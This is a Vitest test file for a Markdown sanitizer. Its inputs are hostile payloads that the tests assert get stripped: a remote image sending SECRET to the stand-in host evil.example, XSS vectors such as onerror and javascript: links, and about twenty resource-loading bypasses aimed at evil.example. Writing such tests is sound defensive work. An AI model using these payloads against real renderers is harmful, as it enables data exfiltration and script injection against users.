import { test, expect } from 'vitest';
import { renderMarkdown } from '../src/markdown';

// The ticket's four cases first, then the bypasses an attacker would try next.

test('remote images are removed (exfiltration)', () => {
  const html = renderMarkdown('hi ![x](https://evil.example/p?q=SECRET)');
  expect(html).not.toContain('evil.example');
  expect(html).not.toContain('<img');
});
test('links are not clickable', () => {
  const html = renderMarkdown('[click](https://evil.example)');
  expect(html).not.toContain('<a');
  expect(html).toContain('https://evil.example');
});
test('scripts and event handlers are stripped', () => {
  const html = renderMarkdown('<img src=x onerror=alert(1)><script>alert(1)</script>');
  expect(html).not.toMatch(/onerror|<script/);
});
test('data: images survive', () => {
  expect(renderMarkdown('![a](data:image/png;base64,iVBORw0KGgo=)')).toContain('<img');
});

test.each([
  ['raw remote img', '<img src="https://evil.example/x.png">'],
  ['protocol-relative img', '<img src="//evil.example/x.png">'],
  ['srcset', '<img src="data:image/png;base64,AA==" srcset="https://evil.example/x.png 2x">'],
  ['reference-style image', '![x][r]\n\n[r]: https://evil.example/x.png'],
  ['svg data image', '<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=" alt="evil.example">'],
  ['picture/source', '<picture><source srcset="https://evil.example/x.png"><img src="data:image/png;base64,AA=="></picture>'],
  ['video poster', '<video poster="https://evil.example/x.png"></video>'],
  ['audio', '<audio src="https://evil.example/x.mp3"></audio>'],
  ['iframe', '<iframe src="https://evil.example/"></iframe>'],
  ['object/embed', '<object data="https://evil.example/"></object><embed src="https://evil.example/">'],
  ['link stylesheet', '<link rel="stylesheet" href="https://evil.example/x.css">'],
  ['style tag', '<style>body{background:url(https://evil.example/x)}</style>'],
  ['style attribute', '<p style="background:url(https://evil.example/x)">hi</p>'],
  ['table background', '<table background="https://evil.example/x"><tr><td>a</td></tr></table>'],
  ['meta refresh', '<meta http-equiv="refresh" content="0;url=https://evil.example/">'],
  ['base href', '<base href="https://evil.example/">'],
  ['form action', '<form action="https://evil.example/"><button>go</button></form>'],
  ['svg image', '<svg><image href="https://evil.example/x.png"/></svg>'],
  ['math href', '<math href="https://evil.example/"><mi>x</mi></math>'],
])('no resource reference survives: %s', (_name, src) => {
  const html = renderMarkdown(src);
  expect(html).not.toMatch(/evil\.example|<(iframe|object|embed|link|style|meta|base|form|svg|math|video|audio|source)\b/i);
  // The only <img> that may remain is a bare inline raster one.
  expect(html).not.toMatch(/<img(?! src="data:image\/(png|jpe?g|gif|webp|avif);base64,[^"]*">)/);
});

test('raw HTML anchors lose their href', () => {
  const html = renderMarkdown('<a href="https://evil.example/?q=SECRET" ping="https://evil.example/p">x</a>');
  expect(html).not.toMatch(/<a\b|href=|ping=/);
});
test('javascript: links are inert text', () => {
  const html = renderMarkdown('[x](javascript:alert(1))');
  expect(html).not.toMatch(/<a\b|href=/);
});
test('content inside a link is sanitized too', () => {
  const html = renderMarkdown('[<img src=x onerror=alert(1)>](https://e.example)');
  expect(html).not.toMatch(/onerror|<img/);
});
test('autolinks are inert', () => {
  expect(renderMarkdown('see https://evil.example/x')).not.toContain('<a');
});
test('the href in a link title cannot break out of the attribute', () => {
  const html = renderMarkdown('[x](https://e.example/"onmouseover="alert(1))');
  expect(html).not.toMatch(/\sonmouseover=/);
});
test('no ids or data attributes (DOM clobbering)', () => {
  expect(renderMarkdown('<p id="x" name="y" data-z="1">hi</p>')).not.toMatch(/id=|name=|data-z/);
});
test('a reply cannot borrow app UI classes', () => {
  const html = renderMarkdown('<span class="msg user login">fake</span>\n\n```js\nx\n```');
  expect(html).not.toMatch(/msg|login/);
  expect(html).toContain('class="language-js"');
});
test('ordinary Markdown still renders', () => {
  const html = renderMarkdown('# T\n\n**b** `c`\n\n```js\nx\n```\n\n| a |\n|---|\n| 1 |');
  for (const tag of ['<h1>', '<strong>', '<code>', '<pre>', '<table>']) expect(html).toContain(tag);
});
